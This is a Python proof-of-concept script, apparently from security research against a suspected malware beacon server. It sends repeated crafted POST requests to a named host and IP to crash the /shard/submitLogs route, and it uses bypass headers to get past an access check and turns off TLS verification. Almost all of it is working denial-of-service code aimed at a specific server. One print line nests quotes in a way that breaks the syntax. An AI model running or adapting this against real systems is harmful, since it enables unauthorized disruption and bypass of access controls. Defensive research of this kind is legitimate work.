#!/usr/bin/env python3
"""
POC-03: Persistent Denial-of-Service via /shard/submitLogs
==========================================================
Target:  https://thisisafalsepositive.st  (185.178.208.191)
Vuln:    /shard/submitLogs raises an unhandled Python exception for
         ANY input to the logs field (null, array, string, integer, dict).
         Every request crashes the Flask route handler with HTTP 500.
         Sustained requests exhaust Gunicorn/uWSGI worker threads causing
         degraded availability.
Impact:  Repeated 500s can saturate Flask worker pool, delaying or blocking
         legitimate beacon processing from active victims.
Prereq:  POC-01 (X-Runtime-Env header bypass)
Author:  Security Research — 2026-07-20
"""
import urllib.request, urllib.error, json, ssl, time, sys

TARGET_IP  = "185.178.208.191"
HOST        = "thisisafalsepositive.st"
UA          = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
REQUESTS    = int(sys.argv[1]) if len(sys.argv) > 1 else 10

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

BYPASS_HEADERS = {
    "X-Runtime-Env": "jre-embedded",
    "X-Edge-Cache-Revalidate": "stale-if-error"
}

def crash():
    data = json.dumps({"logs": None}).encode()
    req = urllib.request.Request(
        f"https://{TARGET_IP}/shard/submitLogs",
        data=data, method="POST",
        headers={"Host": HOST, "User-Agent": UA,
                 "Content-Type": "application/json", **BYPASS_HEADERS}
    )
    try:
        urllib.request.urlopen(req, timeout=10, context=ctx)
        return 200
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

print(f"=== DoS PROBE: {REQUESTS} requests to /shard/submitLogs ===")
print("Crash trigger: {"logs": null} — unhandled NoneType iteration in Flask route")
print()
crash_count = 0
for i in range(REQUESTS):
    code = crash()
    if code == 500:
        crash_count += 1
    print(f"  Request {i+1:3d}/{REQUESTS}: HTTP {code} {'[CRASH]' if code==500 else '[OK]'}")
    time.sleep(0.1)

print()
print(f"[+] {crash_count}/{REQUESTS} requests caused HTTP 500 server crash")
print(f"[+] Crash rate: {crash_count/REQUESTS*100:.0f}%")
if crash_count == REQUESTS:
    print("[+] 100% crash rate confirmed — vulnerability is reliable and consistent")
